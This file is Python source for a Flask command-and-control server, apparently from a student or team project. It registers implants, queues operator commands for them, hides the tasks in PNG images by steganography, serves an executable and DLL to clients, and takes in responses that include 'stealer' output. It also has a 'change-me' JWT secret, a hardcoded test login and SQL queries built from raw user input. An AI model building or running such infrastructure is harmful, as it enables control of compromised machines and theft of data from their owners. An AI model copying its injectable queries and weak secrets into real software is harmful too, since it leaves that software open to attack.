# The C2 Server
import json
import os
from datetime import datetime

import config
import Steganography
import tools
from decouple import config
from flask import (Flask, jsonify, make_response, redirect, render_template,
                   request, url_for, send_file, send_from_directory)
from flask_cors import CORS, cross_origin
from flask_jwt_extended import (JWTManager, create_access_token, get_jwt,
                                get_jwt_identity, jwt_required,
                                unset_jwt_cookies)
from psycopg2 import connect, sql
import WyattWonderland

app = Flask(__name__)
CORS(app)

config.host = config('host')
config.password = config('password')
config.username = config('username')
config.port = config('thePort')
config.database = config('database')
config.clientURL = config('client')

# Code taken from https://dev.to/nagatodev/how-to-add-login-authentication-to-a-flask-and-react-application-23i7
app.config["JWT_SECRET_KEY"] = "change-me"
app.config['CORS_HEADERS'] = 'Content-Type'
jwt = JWTManager(app)


@app.route('/logout', methods=["POST"])
def logout():
    try:
        response = jsonify({"msg": "logout success"})
        unset_jwt_cookies(response)
        return response
    except:
        return "couldn't logout...", 500, {'Access-Control-Allow-Origin': config.clientURL}


@app.route('/login', methods=["POST"])
def create_token():
    access_token = ""
    try:
        data = request.form
        username = data["username"]
        password = data["password"]
        print(username)
        print(password)
        if username != "test" or password != "test":  # hardcoded login, TODO compare to database
            return {"msg": "Wrong email or password"}, 401, {'Access-Control-Allow-Origin': config.clientURL}

        access_token = create_access_token(identity=username)
        print(f"success logging in: {access_token}")
        return ({'access_token': access_token}, 200, {'Access-Control-Allow-Origin': config.clientURL})
    except Exception as error:
        print(f"error logging in: {error}")
        return {'failure': 'failure'}, 500, {'Access-Control-Allow-Origin': config.clientURL}


@app.route("/test", methods=["GET"])
def handle_test():
    stuff = tools.executeInsertQuery("SELECT * from command_queue")
    return jsonify(stuff)


@app.route("/")
def home():
    return "<div>Hi</div>", 200

@app.route("/lib")
def handle_lib():
    return send_from_directory(directory="./", filename="libpng16.dll")

@app.route("/steg")
def handle_steg():
    return send_from_directory(directory="./", filename="Steganography.exe")
# api endpoint to queue a command
@app.route("/queueCommand", methods=["POST"])
@jwt_required()
def handle_execute():
    print("hello??")
    try:
        print("Enterring execute")
        target_implant_id = int(request.form.get('target_implant_id'))
        command = request.form.get('command')
        created_on = datetime.now(tz=None).isoformat()
        status = "untouched"
        current_user = get_jwt_identity()

        columns = ['target_implant_id', 'command', 'created_on', 'status', 'creator']
        
        data = target_implant_id, command, created_on, status, current_user
        print("About to send query")
        print(data)
        print(current_user)
        query = tools.insertQueryBuilder("task_queue", columns, ["task_id"])
        print(f"data: {data}")
        db_resp = tools.executeInsertQuery(query, data)
        print(db_resp)
        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as error:
        print(f"Failure sending commands: {error}")
        return error, {'Access-Control-Allow-Origin': config.clientURL}

# List all commands for a particular implant
@app.route("/get_qcommands", methods=["POST"])
def get_qcommands():
    data = request.json
    id = data['id']
    # if [";", "\'", "\""] in id:
    #     return "What", 401, {'Access-Control-Allow-Origin': config.clientURL}

    try:
        query = sql.SQL("select * from {table} where {column} = %s").format(
            table=sql.Identifier('task_queue'),
            column=sql.Identifier('target_implant_id'))
        db_resp = tools.executeSelectQueryVars(query, [id])
        print(f"this is the db response: {db_resp}")
        if db_resp == None:
            db_resp = {"commands": "No commands found"}
        query = "UPDATE task_queue SET status=%s WHERE id=%s"
        tools.executeGenericVar(query, ['executing', id])

        img = Steganography.iio.imread("doge.png")
        Steganography.iio.imwrite("doge_encoded.png", Steganography.encode(img, json.dumps(db_resp, default=str)))
        response = send_file('doge_encoded.png', mimetype='image/png')
        return response, {'Access-Control-Allow-Origin': config.clientURL}

    except Exception as error:
        print("failed to retrieve data on get_qcommands")
        print(error)
        return error, {'Access-Control-Allow-Origin': config.clientURL}


# List all commands for a particular implant
@app.route("/get_commands", methods=["POST"])
def get_commands():
    data = request.json
    id = data['id']
    # if [";", "\'", "\""] in id:
    #     return "What", 401, {'Access-Control-Allow-Origin': config.clientURL}
    try:
        query = sql.SQL("select * from {table} where {column} = %s").format(
            table=sql.Identifier('task_queue'),
            column=sql.Identifier('target_implant_id'))
        db_resp = tools.executeSelectQueryVars(query, [id])
        print(f"this is the db response: {db_resp}")
        if db_resp == None:
            db_resp = {"commands": "No commands found"}
   
        response = db_resp
        return response, {'Access-Control-Allow-Origin': config.clientURL}

    except Exception as error:
        print("failed to retrieve data on get_commands")
        print(error)
        return error, {'Access-Control-Allow-Origin': config.clientURL}

# List untouched commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
@app.route("/get_untouched", methods=["POST"])
def get_untouched():
    data = request.json
    id = data['id']
    try:
        db_resp = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"untouched\")")
        print(f"this is the db response: {db_resp}")
        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as error:
        print("failed to retrieve data on untouched")
        print(error)
        return error, {'Access-Control-Allow-Origin': config.clientURL}

# List executing commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
@app.route("/get_executing", methods=["POST"])
def get_executing():
    data = request.json
    id = data['id']
    try:
        db_resp = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"executing\")")
        print(f"this is the db response: {db_resp}")
        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as error:
        print("failed to retrieve data on get_executing")
        print(error)
        return error, {'Access-Control-Allow-Origin': config.clientURL}

# List executed commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
@app.route("/get_executed", methods=["POST"])
def get_executed():
    data = request.json
    id = data['id']
    try:
        db_resp = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"executed\")")
        print(f"this is the db response: {db_resp}")
        return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as error:
        print("failed to retrieve data on get_executed")
        print(error)
        return error, {'Access-Control-Allow-Origin': config.clientURL}

# Register an implant, on the implant side TODO 
@app.route("/register_implant", methods=["POST"])
def register_implant():
    try:
        print("Registering Implant")
        data = request.json
        print(f"Recieved: {data}")
        print(data['sleep'])
        jitter = data['jitter']
        sleep = data['sleep']
        first_connection = last_seen = datetime.now()
        active = True
        columns = ["first_connection", "active",
                   "jitter", "sleep", "last_seen"]
        values = [first_connection, active, jitter, sleep, last_seen]
        print("Executing Query")
        query = tools.insertQueryBuilder("implants", columns, ["implant_id"])
        response = tools.executeInsertQuery(query, values)
        print(f"Response: {response}")
        return response, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as e:
        print(f"ERROR: {e}")
        return e, {'Access-Control-Allow-Origin': config.clientURL}

# Display implants
@app.route("/display_implants", methods=["GET"])
def display_implants():
    try:
        dbResp = tools.executeSelectQuery("SELECT * FROM IMPLANTS")
        print(dbResp)
        return dbResp, 200, {'Access-Control-Allow-Origin': config.clientURL}
    except Exception as e:
        print(f"Error displaying implants: {e}")
        return e, {'Access-Control-Allow-Origin': config.clientURL}


@app.route("/response", methods=["POST"])
def handle_response():
    try:
        
        # file = request.files['file']
        data = request.json(force=True)
        print()
        print("response:")
        # print(file.name)
        # string_rep = Steganography.decode(Steganography.iio.imread(file))
        # print(string_rep)
        # data = json.loads(string_rep)
        target_implant_id = data['target_implant_id']
        task_id = data['task_id']
        response_data = data['response_data']
        success = data['success']
        command = data['command']

        print("checking command: " + command)
        if "stealer" in command: 
            # TODO call Wyatt's function 
            response_data = WyattWonderland.parsejson(response_data)
            
        print("Querying now")
        # DUMP BACK INTO TASK_QUEUE 
        query = "UPDATE task_queue SET (status='executed' response_data=%s success=%s recieved_on=%s) WHERE task_id=%s"

        print("succesful")
        time = datetime.now()
        tools.executeGenericVar(query, [response_data, success, time, task_id])

        # img = iio.imread("doge.png")
        # iio.imwrite("doge_encoded.png", encode(img, "HelloWorld"))
        # print(decode(iio.imread("doge_encoded.png")))

    except Exception as error:
        return error, {'Access-Control-Allow-Origin': config.clientURL}


@app.route("/response_test", methods=["POST"])
def testThis():
    try:
        file = "file not accesed"
        file = request.files['file']
        message = Steganography.decode(Steganography.iio.imread(file))
        print(message)
        return 'yer', 200, {'Access-Control-Allow-Origin': '*'}
    except Exception as error:
        print(error)
        return error, 401, {'Access-Control-Allow-Origin': '*'}

# Gets log history of a particular implant
@app.route("/get_history", methods=["POST"])
def get_history():
    try:

        data = request.json
        id = data['id']

        all = tools.executeSelectQuery(f"SELECT * FROM task_queue WHERE target_implant_id={id}")
        print(all)

        pending = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'untouched\')")
        print(f"this is pending responses: {pending}")

        print(pending)

        executed = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executed\')")
        print(f"this is executed responses: {executed}")

        executing = tools.executeSelectQuery(
            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executing\')")
        print(f"this is executing responses: {executing}")
        # "success": x[-3]
        # [(2, 1, 'implant', datetime.datetime(2022, 12, 1, 16, 58, 44, 674016), 'untouched', responseData, success, recieved, creator)
        pending = [{"sender": "user", "creator":x[-1], "time":x[3], "command":x[2] } for x in pending]
        combined = [{"sender": "user", "creator":x[-1], "time":x[3], "command":x[2] } for x in executed]
        combined += [{"sender": "implant", "time":x[-2], "command":x[2], "response":x[-4]} for x in executed] 
        combined += pending

        sortedList = sorted(combined, key=lambda x: x['time']) 

        print(f"Sorted List: {sortedList}")

        return {"sorted": sortedList}, 200, {'Access-Control-Allow-Origin': '*'}
    except Exception as e:
        print(e)
        return e, {'Access-Control-Allow-Origin': '*'}


    # Construct a linear history of commands -> responses

# for testing
# def main():
#     target_implant_id = 1
#     command = 'some long command'
#     created_on = '2022-12-01T16:41:10.592868'
#     status = 'untouched'
#     data = [target_implant_id, command, created_on, status]
#     columns = ['target_implant_id', 'command', 'created_on', 'status']

#     query = insertQueryBuilder('task_queue', columns)
#     results = executeInsertQuery(query, data)

#     print(results)


# if __name__ == "__main__":
#     main()
